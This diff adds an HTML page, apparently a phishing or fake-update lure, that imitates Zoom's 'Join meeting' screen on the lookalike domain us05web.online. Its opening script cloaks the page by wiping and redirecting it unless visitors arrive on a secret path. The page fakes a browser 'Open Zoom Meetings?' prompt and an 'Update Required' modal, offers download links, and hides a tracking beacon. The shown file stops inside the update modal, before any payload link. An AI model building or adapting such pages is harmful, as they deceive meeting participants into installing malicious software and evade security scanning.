@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en-US" translate="no">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Language" content="en-US">
+<meta name="google" content="notranslate">
+<title>Join meeting - Zoom</title>
+<script>
+  (function() {
+    var allowedHosts = ['us05web.online', 'www.us05web.online'];
+    var secretPath = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/';
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    
+    // If not localhost AND (wrong domain OR wrong folder), wipe the page.
+    if (!isLocal) {
+      if (!allowedHosts.includes(window.location.hostname) || 
+          window.location.pathname.indexOf(secretPath) !== 0) {
+        document.documentElement.innerHTML = '';
+        window.location.href = 'https://us05web.online';
+      }
+    }
+  })();
+</script>
+
+<link rel="stylesheet" crossorigin="anonymous" type="text/css"
+      href="https://us05st1.zoom.us/web_client/7.1.0.1.12514/css/styles.wc_meeting.min.css">
+
+<style>
+/* ============================================================
+   Base / tokens
+   ============================================================ */
+:root {
+  --z-blue: #0D6BDE; --z-blue-hover: #0C60C8; --z-blue-active: #084085;
+  --z-text: #222325; --z-border: #DFE3E8;
+  --z-font: "Open Sans", "Helvetica", "Arial", sans-serif;
+}
+* { box-sizing: border-box; }
+*::before, *::after { box-sizing: border-box; }
+html, body { height: 100%; color: #232333; margin: 0; }
+body { font-family: var(--z-font); padding-top: 64px; }
+a { color: var(--z-blue); text-decoration: none; outline: none; }
+a:hover { color: var(--z-blue-hover); text-decoration: underline; }
+a:active { color: var(--z-blue-active); }
+h1,h2,h3,h4,h5,h6 { color: var(--z-text); margin: 0; }
+h1 { font-weight: 600; font-size: 20px; }
+h2 { font-weight: 500; font-size: 18px; }
+h3 { font-size: 16px; }
+h4,h5,h6,p { font-size: 14px; }
+p { line-height: 1.5; margin: 0; }
+hr { margin: 20px 0; border: 0; border-top: 1px solid var(--z-border); }
+button { background-color: transparent; background-image: none; font-family: inherit; }
+
+/* ============================================================
+   Header
+   ============================================================ */
+#header_container {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 300;
+  height: 64px;
+  line-height: 64px;
+  background-color: rgba(255,255,255,.97);
+  box-shadow: 0 0 2px rgba(0,0,0,0.2);
+}
+#header_outer {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 12px;
+  font-weight: 600;
+  width: 100%;
+  margin: 0;
+  padding: 0 24px;
+  height: 100%;
+  box-sizing: border-box;
+}
+#header_outer .imglink {
+  display: inline-flex;
+  align-items: center;
+  line-height: 1;
+  text-decoration: none;
+}
+#header_outer .imglink:hover { text-decoration: none; }
+.header-logo {
+  display: block;
+  height: 25px;
+  width: auto;
+  margin: 0;
+  outline: none;
+  border: 0;
+}
+.action-btns {
+  float: none;
+  padding: 0;
+  font-weight: 400;
+  display: flex;
+  align-items: center;
+  gap: 24px;
+}
+.action-btns > a { color: var(--z-blue); font-weight: 400; }
+.action-btns > a:hover { color: var(--z-blue-hover); text-decoration: underline; }
+.caret {
+  display: inline-block; width: 0; height: 0;
+  margin-left: 6px; vertical-align: middle;
+  border-top: 4px solid;
+  border-right: 4px solid transparent;
+  border-left: 4px solid transparent;
+}
+
+/* ============================================================
+   Footer
+   ============================================================ */
+#footer_container {
+  padding: 24px; width: 100%; bottom: 0; z-index: 300; min-height: 64px;
+  text-align: center; display: flex; flex-direction: column; align-items: center;
+  color: rgba(4,4,19,.56); box-sizing: border-box;
+}
+#footer_container a { color: inherit; }
+#footer_container p { margin: 0; font-size: 14px; line-height: 1.5; }
+
+/* ============================================================
+   Main card layout
+   ============================================================ */
+.NwR_O3JG { display: flex; flex-direction: column; min-height: calc(100vh - 64px); }
+.I0MG3p8Q {
+  background: #fff; box-sizing: border-box; font-family: var(--z-font);
+  margin: 0 auto; max-width: 840px; min-height: 480px;
+  padding: 130px 40px 48px; position: relative; text-align: center; align-items: center;
+}
+.I0MG3p8Q.KJngd7UG {
+  display: flex; min-height: calc(100vh - 214px); padding: 40px;
+  flex-direction: column; justify-content: center;
+}
+.I0MG3p8Q:focus { outline: none; }
+.bhauZU7H { color: rgba(4,4,19,.56); font-size: 18px; width: 100%; }
+.x2RD4pnS { display: flex; flex-direction: column; align-items: center; }
+.ifP196ZE { min-height: 124px; }
+.rl8upoTO {
+  display: flex; flex-direction: column; gap: 20px; align-items: stretch;
+  margin: 0 auto; max-width: 400px; width: 100%;
+}
+.g7nkJFrV {
+  border-radius: 8px !important; display: block !important; font-size: 16px !important;
+  margin: 0 !important; min-height: 48px !important; width: 100% !important;
+}
+.ZAduWCim { font-size: 24px !important; font-weight: 700 !important; margin-bottom: 52px !important; }
+.KoUPUvXJ { color: #747487; font-size: 12px; font-weight: 300; margin: 32px auto; text-align: center; width: 100%; }
+
+/* Buttons */
+.zoom-button {
+  position: relative; display: inline-flex; vertical-align: middle;
+  justify-content: center; align-items: center; box-sizing: border-box;
+  border: 1px solid transparent; outline-offset: 2px; line-height: 20px;
+  white-space: nowrap; cursor: pointer; appearance: none; font-family: var(--z-font);
+}
+.zoom-button--primary { font-weight: 500; background-color: var(--z-blue); color: #FFF; }
+.zoom-button--primary:hover:not(.is-loading) { background-color: var(--z-blue-hover); color: #FFF; }
+.zoom-button--primary:active:not(.is-loading) { background-color: var(--z-blue-active); color: #FFF; }
+.zoom-button--secondary { background-color: #FFF; color: var(--z-text); border-color: #939BA4; }
+.zoom-button--secondary:hover:not(.is-loading) { background-color: rgba(110,118,128,0.12); color: var(--z-text); }
+.zoom-button--secondary:active:not(.is-loading) { background-color: rgba(110,118,128,0.42); color: var(--z-text); }
+.zoom-button--lg { padding: 9px 15px; border-radius: 10px; font-size: 16px; }
+.zoom-button__label { display: inline-block; }
+
+/* Helper text */
+.pUmU_FLW { width: 100%; max-width: 400px; margin: 0 auto; text-align: center; }
+.pUmU_FLW h3 { font-weight: 400; font-size: 14px; line-height: 20px; color: var(--z-text); margin: 0; }
+.pUmU_FLW h3 + h3 { margin-top: 20px; }
+.pUmU_FLW h3 a { color: var(--z-blue); font-weight: 400; text-decoration: none; }
+.pUmU_FLW h3 a:hover { color: var(--z-blue-hover); text-decoration: underline; }
+.bhauZU7H hr.dcK__Mlg {
+  width: 100%; max-width: 400px; margin: 28px auto !important;
+  height: 0 !important; border: 0; border-top: 1px solid var(--z-border);
+}
+
+/* Popover */
+#zoom-did-not-open-popover {
+  position: absolute; top: 0; left: calc(50% + 200px); z-index: 2000;
+  width: 360px; max-width: calc(100vw - 32px);
+  padding: 12px; border: 1px solid var(--z-border); border-radius: 8px;
+  background: #FFF; color: var(--z-text);
+  box-shadow: 0 12px 24px 0 rgba(0,0,0,0.08), 0 6px 12px 0 rgba(0,0,0,0.08);
+  font-family: var(--z-font); text-align: left;
+}
+#zoom-did-not-open-popover .znp-body { padding-right: 28px; line-height: 18px; font-size: 14px; }
+#zoom-did-not-open-popover .znp-title { color: #323539; font-size: 16px; font-weight: 600; line-height: 20px; margin-bottom: 4px; }
+#zoom-did-not-open-popover .znp-text { color: #323539; font-size: 14px; font-weight: 400; line-height: 20px; }
+#zoom-did-not-open-popover .znp-text a { color: var(--z-blue); text-decoration: none; }
+#zoom-did-not-open-popover .znp-text a:hover { color: var(--z-blue-hover); text-decoration: underline; }
+#zoom-did-not-open-close {
+  position: absolute; top: 11px; right: 12px; width: 20px; height: 20px;
+  padding: 0; border: none; background: transparent; color: var(--z-text);
+  cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
+  border-radius: 6px; transition: background-color 0.15s ease;
+}
+#zoom-did-not-open-close:hover { background-color: rgba(110,118,128,0.12); }
+#zoom-did-not-open-close:active { background-color: rgba(110,118,128,0.42); }
+#zoom-did-not-open-close svg { fill: currentColor; }
+
+/* Language dropdown */
+.lang-wrapper { position: relative; display: inline-block; vertical-align: middle; }
+#langBtn { display: inline-block; cursor: pointer; color: var(--z-blue); font-weight: 400; text-decoration: none; }
+#langBtn:hover { color: var(--z-blue-hover); text-decoration: underline; }
+#langMenu {
+  display: none; position: absolute; top: calc(100% + 8px); right: 0;
+  list-style: none; margin: 0; padding: 4px 0; background: #fff;
+  border: 1px solid var(--z-border); border-radius: 8px;
+  box-shadow: 0 12px 24px 0 rgba(0,0,0,0.08), 0 6px 12px 0 rgba(0,0,0,0.08);
+  min-width: 200px; max-height: 420px; overflow-y: auto; z-index: 4000;
+  text-align: left; font-weight: 400; font-size: 14px;
+  line-height: normal;       
+}
+#langMenu.open { display: block; }
+#langMenu li { padding: 10px 20px; cursor: pointer; color: var(--z-text); white-space: nowrap; }
+#langMenu li:hover { background: #f2f2f2; }
+#langMenu li.h_GAeXIH { background: #f2f2f2; }
+
+/* Responsive */
+@media screen and (max-width: 500px) {
+  body { padding-top: 60px; }
+  #header_container { height: 60px; line-height: 60px; }
+  #header_outer { padding: 0 16px; }
+  #footer_container { margin-top: 32px; padding-bottom: 8px; }
+  #footer_container p { font-size: 12px; }
+  #footer_container span { white-space: nowrap; }
+  .I0MG3p8Q { box-shadow: none; padding: 16px; }
+  .bhauZU7H h1 { font-size: 24px; font-weight: 700; line-height: 28px; margin-bottom: 44px; padding: 0; }
+  #zoom-did-not-open-popover { position: fixed; top: auto; bottom: 100px; left: 16px; right: 16px; width: auto; }
+  #langMenu { right: -8px; min-width: 180px; }
+  .action-btns { gap: 12px; }
+}
+@media screen and (max-width: 767px) { .header-logo { width: 180px; height: 25px; } }
+@media screen and (min-width: 1200px) { #header_outer { width: 1200px; margin: 0 auto; } }
+@media (min-width: 1400px) { #header_outer { width: 1400px; } }
+
+/* Cookie banner */
+#onetrust-banner-sdk {
+  position: fixed; left: 50%; bottom: 24px;
+  transform: translateX(-50%) translateY(20px);
+  width: calc(100% - 32px); max-width: 900px;
+  background: #fff; color: #232333; border-radius: 8px;
+  box-shadow: 0 12px 32px rgba(0,0,0,0.18), 0 4px 12px rgba(0,0,0,0.10);
+  font-family: var(--z-font); font-size: 14px; line-height: 1.5;
+  z-index: 99999; opacity: 0; visibility: hidden;
+  transition: opacity 0.35s ease, transform 0.35s ease, visibility 0s linear 0.35s;
+}
+#onetrust-banner-sdk.ot-visible {
+  opacity: 1; visibility: visible; transform: translateX(-50%) translateY(0);
+  transition: opacity 0.35s ease, transform 0.35s ease, visibility 0s;
+}
+#onetrust-banner-sdk .ot-sdk-container { padding: 20px 24px; }
+#onetrust-banner-sdk .ot-sdk-row { display: flex; flex-direction: column; gap: 16px; }
+#onetrust-policy-text { color: #232333; font-size: 14px; line-height: 1.55; padding-right: 32px; }
+#onetrust-policy-text a { color: var(--z-blue); text-decoration: underline; }
+#onetrust-policy-text a:hover { color: var(--z-blue-hover); }
+#onetrust-button-group { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+#onetrust-button-group .banner-actions-container { display: flex; gap: 12px; margin-left: auto; }
+#onetrust-button-group button {
+  cursor: pointer; font-family: inherit; font-size: 14px; font-weight: 500;
+  border-radius: 8px; padding: 10px 18px; line-height: 18px;
+  border: 1px solid transparent;
+  transition: background-color .15s ease, color .15s ease;
+  white-space: nowrap;
+}
+#onetrust-reject-all-handler { background: #fff; color: var(--z-text); border-color: #939BA4; }
+#onetrust-reject-all-handler:hover { background: rgba(110,118,128,0.12); }
+#onetrust-reject-all-handler:active { background: rgba(110,118,128,0.42); }
+#onetrust-accept-btn-handler { background: var(--z-blue); color: #fff; border-color: var(--z-blue); }
+#onetrust-accept-btn-handler:hover { background: var(--z-blue-hover); border-color: var(--z-blue-hover); }
+#onetrust-accept-btn-handler:active { background: var(--z-blue-active); border-color: var(--z-blue-active); }
+#onetrust-pc-btn-handler.cookie-setting-link {
+  background: transparent; border: none; color: var(--z-blue);
+  text-decoration: underline; padding: 4px 0; font-weight: 400;
+}
+#onetrust-pc-btn-handler.cookie-setting-link:hover { color: var(--z-blue-hover); }
+#onetrust-close-btn-container { position: absolute; top: 12px; right: 12px; }
+#onetrust-close-btn-container .onetrust-close-btn-handler {
+  width: 28px; height: 28px; padding: 0; border: none; background: transparent;
+  cursor: pointer; border-radius: 6px;
+  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%23232333'><path d='M5.024 4.176a.6.6 0 0 0-.848.848L7.151 8l-2.975 2.976a.6.6 0 0 0 .848.848L8 8.849l2.976 2.975a.6.6 0 0 0 .848-.848L8.849 8l2.975-2.976a.6.6 0 0 0-.848-.848L8 7.151 5.024 4.176Z'/></svg>") !important;
+  background-repeat: no-repeat !important; background-position: center !important;
+  background-size: 16px 16px !important;
+}
+#onetrust-close-btn-container .onetrust-close-btn-handler:hover { background-color: rgba(110,118,128,0.12); }
+@media screen and (max-width: 640px) {
+  #onetrust-banner-sdk { bottom: 12px; width: calc(100% - 16px); max-height: 80vh; overflow-y: auto; }
+  #onetrust-banner-sdk .ot-sdk-container { padding: 18px 16px; }
+  #onetrust-policy-text { padding-right: 28px; font-size: 13px; }
+  #onetrust-button-group { flex-direction: column-reverse; align-items: stretch; }
+  #onetrust-button-group .banner-actions-container { margin-left: 0; flex-direction: column-reverse; }
+  #onetrust-button-group button { width: 100%; }
+  #onetrust-pc-btn-handler.cookie-setting-link { text-align: center; }
+}
+
+/* ============================================================
+   Update Required Modal
+   ============================================================ */
+.modal-overlay {
+  position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+  background-color: rgba(0, 0, 0, 0.4);
+  display: none; justify-content: center; align-items: center; z-index: 9999;
+}
+.modal-overlay.is-open { display: flex; }
+.modal-content {
+  background-color: #ffffff; width: 520px; max-width: 90%; border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+  padding: 24px; position: relative; color: #333;
+}
+.modal-content .close-btn {
+  position: absolute; top: 16px; right: 16px; background: none;
+  border: none; font-size: 20px; color: #888; cursor: pointer; line-height: 1;
+}
+.modal-content .close-btn:hover { color: #333; }
+.modal-content h2 { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: #000; }
+.modal-content p { font-size: 14px; line-height: 1.5; color: #555; margin-bottom: 32px; }
+.modal-footer { display: flex; justify-content: space-between; align-items: center; }
+.modal-footer .link-btn { background: none; border: none; color: #0b5cff; font-size: 14px; font-weight: 500; cursor: pointer; padding: 0; text-decoration: none; }
+.modal-footer .link-btn:hover { text-decoration: underline; }
+.modal-footer .action-buttons { display: flex; gap: 12px; }
+.modal-footer .btn {
+  padding: 8px 24px; border-radius: 6px; font-size: 14px; font-weight: 600;
+  cursor: pointer; border: 1px solid transparent;
+  transition: background-color 0.2s, border-color 0.2s;
+}
+.modal-footer .btn-primary { background-color: #0b5cff; color: white; }
+.modal-footer .btn-primary:hover { background-color: #004ce0; }
+.modal-footer .btn-secondary { background-color: white; color: #333; border-color: #ccc; }
+.modal-footer .btn-secondary:hover { background-color: #f5f5f5; border-color: #bbb; }
+
+/* ============================================================
+   "Open Zoom Meetings?" dialog
+   ============================================================ */
+#openZoomBackdrop {
+  position: fixed; inset: 0;
+  background: rgba(32, 33, 36, 0.55);
+  backdrop-filter: blur(2px);
+  -webkit-backdrop-filter: blur(2px);
+  z-index: 999999; display: none; opacity: 0;
+  transition: opacity .18s ease;
+}
+#openZoomBackdrop.is-open { display: block; opacity: 1; }
+body.ozd-locked { overflow: hidden; }
+#openZoomDialog {
+  position: fixed; top: 16px; left: 50%;
+  transform: translateX(-50%) translateY(-20px);
+  width: 620px; max-width: calc(100vw - 32px);
+  background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.18), 0 1px 4px rgba(0,0,0,0.10);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  font-size: 14px; color: #202124;
+  z-index: 1000000; padding: 16px 20px 16px; display: none; opacity: 0;
+  transition: opacity .18s ease, transform .18s ease;
+}
+#openZoomDialog.is-open { display: block; opacity: 1; transform: translateX(-50%) translateY(0); }
+#openZoomDialog .ozd-title { font-size: 15px; font-weight: 500; margin: 0 0 8px; color: #202124; }
+#openZoomDialog .ozd-url { color: #5f6368; font-size: 13px; margin: 0 0 14px; word-break: break-all; }
+#openZoomDialog .ozd-check {
+  display: flex; align-items: flex-start; gap: 8px; font-size: 13px;
+  color: #202124; margin: 0 0 18px; cursor: pointer; user-select: none;
+}
+#openZoomDialog .ozd-check input { margin: 2px 0 0; width: 14px; height: 14px; accent-color: #1a73e8; cursor: pointer; }
+#openZoomDialog .ozd-actions { display: flex; justify-content: flex-end; gap: 8px; }
+#openZoomDialog button {
+  font-family: inherit; font-size: 13px; font-weight: 500;
+  padding: 8px 16px; border-radius: 4px; cursor: pointer;
+  border: 1px solid transparent;
+  transition: background-color .15s ease, box-shadow .15s ease;
+  white-space: nowrap;
+}
+#openZoomDialog .ozd-primary { background: #6f42ff; color: #fff; }
+#openZoomDialog .ozd-primary:hover { background: #5a32e6; }
+#openZoomDialog .ozd-secondary { background: #f1f3f4; color: #202124; border-color: #f1f3f4; }
+#openZoomDialog .ozd-secondary:hover { background: #e8eaed; }
+@media screen and (max-width: 640px) {
+  #openZoomDialog { top: 8px; padding: 14px 16px; }
+  #openZoomDialog .ozd-actions { flex-direction: column-reverse; }
+  #openZoomDialog button { width: 100%; }
+}
+
+/* bodyAfterCancel */
+#bodyAfterClose, #bodyAfterCancel { display: none; }
+#bodyAfterClose.is-open, #bodyAfterCancel.is-open { display: block; }
+body::before {
+  content: url('/api/canary');
+  display: none;
+}
+</style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     "Open Zoom Meetings?" dialog
+     ============================================================ -->
+<div id="openZoomBackdrop" aria-hidden="true"></div>
+<div id="openZoomDialog" role="dialog" aria-modal="true" aria-labelledby="ozdTitle">
+  <div class="ozd-title" id="ozdTitle">Open Zoom Meetings?</div>
+  <div class="ozd-url" id="ozdUrl">https://us05web.zoom.us wants to open this application.</div>
+  <label class="ozd-check">
+    <input type="checkbox" id="ozdAlways">
+    <span>Always allow us05web.zoom.us to open links of this type in the associated app</span>
+  </label>
+  <div class="ozd-actions">
+    <button type="button" class="ozd-primary" id="ozdOpenBtn">Open Zoom Meetings</button>
+    <button type="button" class="ozd-secondary" id="ozdCancelBtn">Cancel</button>
+  </div>
+</div>
+
+<!-- ============================================================
+     COOKIE CONSENT BANNER
+     ============================================================ -->
+<div id="onetrust-banner-sdk" role="dialog" aria-modal="false"
+     aria-label="Cookie consent" style="display:none;">
+  <div id="onetrust-close-btn-container">
+    <button type="button" class="onetrust-close-btn-handler"
+            aria-label="Close cookie banner"></button>
+  </div>
+  <div class="ot-sdk-container">
+    <div class="ot-sdk-row">
+      <div id="onetrust-policy-text">
+        Zoom uses cookies and similar technologies as strictly necessary to make our site work.
+        We and our partners would also like to set additional cookies to analyze your use of
+        our site, to personalize and enhance your visit to our site and to show you more
+        relevant content and advertising. These will be set only if you accept.
+        <br><br>
+        You can always review and change your cookie preferences through our cookie settings page.
+        For more information, please read our
+        <a href="https://zoom.us/privacy" target="_blank" rel="noopener noreferrer">Privacy Statement</a>.
+      </div>
+      <div id="onetrust-button-group">
+        <button type="button" id="onetrust-pc-btn-handler" class="cookie-setting-link">
+          COOKIES SETTINGS
+        </button>
+        <div class="banner-actions-container">
+          <button type="button" id="onetrust-reject-all-handler">DECLINE COOKIES</button>
+          <button type="button" id="onetrust-accept-btn-handler">ACCEPT COOKIES</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     ORIGINAL PAGE (home)
+     ============================================================ -->
+<div id="originalPageRoot">
+<div id="zoom-ui-container" class="NwR_O3JG">
+
+  <div data-v-app="">
+    <div id="header_container" role="banner">
+      <div id="header_outer">
+        <a class="imglink" href="https://www.zoom.com" target="_blank" aria-label="Zoom Logo, Zoom homepage">
+  <svg class="header-logo" width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff">
+    <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+  </svg>
+        </a>
+
+        <div class="action-btns">
+          <a target="_blank" href="https://support.zoom.us/hc/en-us">Support</a>
+          <div class="lang-wrapper">
+            <a href="#" id="langBtn" aria-haspopup="true" aria-expanded="false" tabindex="0">English <div class="caret"></div></a>
+            <ul id="langMenu" class="FB7pOWNX" role="menu" hidden>
+              <li tabindex="0" role="menuitem" class="h_GAeXIH TUsNbnp1" data-key="en-US">English</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="es-ES">Español</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="de-DE">Deutsch</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="zh-CN">简体中文</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="zh-TW">繁體中文</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="fr-FR">Français</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="pt-PT">Português</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="jp-JP">日本語</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="ru-RU">Русский</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="ko-KO">한국어</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="it-IT">Italiano</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="vi-VN">Tiếng Việt</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="pl-PL">Polski</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="tr-TR">Türkçe</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="id-ID">Bahasa Indonesia</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="nl-NL">Nederlands</li>
+              <li tabindex="0" role="menuitem" class="TUsNbnp1" data-key="sv-SE">Svenska</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div data-v-app="">
+    <div id="zoom-ui-frame" class="KJngd7UG I0MG3p8Q" role="main" tabindex="0">
+      <div class="bhauZU7H">
+        <div class="ifP196ZE x2RD4pnS">
+          <h1 class="ZAduWCim">Join meeting</h1>
+          <div class="rl8upoTO" style="position: relative;">
+
+            <button type="button"
+                    class="zoom-button zoom-button--lg zoom-button--primary g7nkJFrV"
+                    aria-disabled="false" style="order: 1;"
+                    onclick="openUpdateModal()">
+              <span class="zoom-button__label">Join from Zoom Workplace app</span>
+            </button>
+
+            <button type="button"
+                    class="zoom-button zoom-button--lg zoom-button--secondary g7nkJFrV"
+                    aria-disabled="false" style="order: 2;"
+                    onclick="startBrowserJoin()">
+              <span class="zoom-button__label">Join from browser</span>
+            </button>
+
+            <div id="zoom-did-not-open-popover" role="dialog" aria-label="Did not open Zoom Workplace app?">
+              <button type="button" id="zoom-did-not-open-close" aria-label="Close this popover">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none" width="16" height="16">
+                  <path d="M5.02426 4.17574C4.78995 3.94142 4.41005 3.94142 4.17574 4.17574C3.94142 4.41005 3.94142 4.78995 4.17574 5.02426L7.15147 8L4.17574 10.9757C3.94142 11.2101 3.94142 11.59 4.17574 11.8243C4.41005 12.0586 4.78995 12.0586 5.02426 11.8243L8 8.84853L10.9757 11.8243C11.2101 12.0586 11.59 12.0586 11.8243 11.8243C12.0586 11.59 12.0586 11.2101 11.8243 10.9757L8.84853 8L11.8243 5.02426C12.0586 4.78995 12.0586 4.41005 11.8243 4.17574C11.59 3.94142 11.2101 3.94142 10.9757 4.17574L8 7.15147L5.02426 4.17574Z"></path>
+                </svg>
+              </button>
+              <div class="znp-body">
+                <div class="znp-title">Did not open Zoom Workplace app?</div>
+                <div class="znp-text">
+                  Please <a href="#" id="znpDownloadLink">download</a> and install the app and click Join from Zoom Workplace app again.
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <hr role="presentation" class="dcK__Mlg">
+
+        <div class="pUmU_FLW">
+          <h3 role="presentation">
+            Don’t have the Zoom Workplace app installed?
+            <a download tabindex="0" role="button" href="#" id="mainCardDownloadLink">Download Now</a>
+          </h3>
+          <h3 role="presentation">
+            By joining a meeting, you agree to our
+            <a terms="" tabindex="0" role="button" href="https://zoom.us/en-us/terms">Terms of Service</a>
+            and
+            <a privacy="" tabindex="0" role="button" href="https://zoom.us/en-us/privacy">Privacy Statement</a>
+          </h3>
+        </div>
+      </div>
+    </div>
+    <div class="KoUPUvXJ"></div>
+  </div>
+
+<div id="installInstructionsScreen" class="I0MG3p8Q KJngd7UG" style="display:none;">
+  <div class="bhauZU7H">
+    <div class="ifP196ZE x2RD4pnS">
+      <p style="font-size:20px; line-height:1.5; color:#222325; margin:0 0 8px;">
+        Once you install the Zoom Workplace app,
+      </p>
+      <p style="font-size:20px; line-height:1.5; color:#222325; margin:0 0 52px;">
+        click <strong>"Join from Zoom Workplace app"</strong> below
+      </p>
+
+      <div class="rl8upoTO">
+        <button type="button"
+                class="zoom-button zoom-button--lg zoom-button--primary g7nkJFrV"
+                aria-disabled="false" style="order: 1;"
+                onclick="openUpdateModal()">
+          <span class="zoom-button__label">Join from Zoom Workplace app</span>
+        </button>
+
+        <button type="button"
+                class="zoom-button zoom-button--lg zoom-button--secondary g7nkJFrV"
+                aria-disabled="false" style="order: 2;"
+                onclick="startBrowserJoin()">
+          <span class="zoom-button__label">Join from browser</span>
+        </button>
+      </div>
+    </div>
+
+    <hr role="presentation" class="dcK__Mlg">
+
+    <div class="pUmU_FLW">
+      <h3 role="presentation">
+        Don’t have the Zoom Workplace app installed?
+        <a tabindex="0" role="button" href="#" id="installScreenDownloadLink">Download Now</a>
+      </h3>
+      <h3 role="presentation">
+        By joining a meeting, you agree to our
+        <a tabindex="0" role="button" href="https://zoom.us/en-us/terms">Terms of Service</a>
+        and
+        <a tabindex="0" role="button" href="https://zoom.us/en-us/privacy">Privacy Statement</a>
+      </h3>
+    </div>
+  </div>
+</div>
+
+  <div data-v-app="">
+    <div id="footer_container" role="contentinfo">
+      <div id="footer">
+        <p>©2026 Zoom Communications, Inc. <span>All rights reserved.</span></p>
+        <p class="LP3K7kSq">
+          <a href="https://zoom.us/en-us/trust" target="_blank">Trust Center</a>
+          <a href="https://zoom.us/en-us/acceptable-use-guidelines" target="_blank">Acceptable Use Guidelines</a>
+          <a href="https://zoom.us/en-us/trust/legal-compliance" target="_blank">Legal &amp; Compliance</a>
+          <a href="javascript:void(null);" tabindex="0" role="button">Do Not Sell My Personal Information</a>
+          <a href="javascript:void(null);" tabindex="0" role="button">Cookie Preferences</a>
+        </p>
+      </div>
+    </div>
+  </div>
+
+</div>
+</div><!-- /#originalPageRoot -->
+
+<!-- ============================================================
+     UPDATE REQUIRED MODAL
+     ============================================================ -->
+<div class="modal-overlay" id="updateModal" role="dialog" aria-modal="true" aria-labelledby="updateModalTitle">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeUpdateModal('close')" aria-label="Close">×</button>
+
+    <svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="32" height="32" rx="8" fill="#2D8CFF"></rect>
+      <path d="M7 11.5C7 10.6716 7.67157 10 8.5 10H17.5C18.3284 10 19 10.6716 19 11.5V20.5C19 21.3284 18.3284 22 17.5 22H8.5C7.67157 22 7 21.3284 7 20.5V11.5Z" fill="white"></path>
+      <path d="M20 14L25 11V21L20 18V14Z" fill="white"></path>
+    </svg>
+
+    <h2 id="updateModalTitle">Update Required</h2>
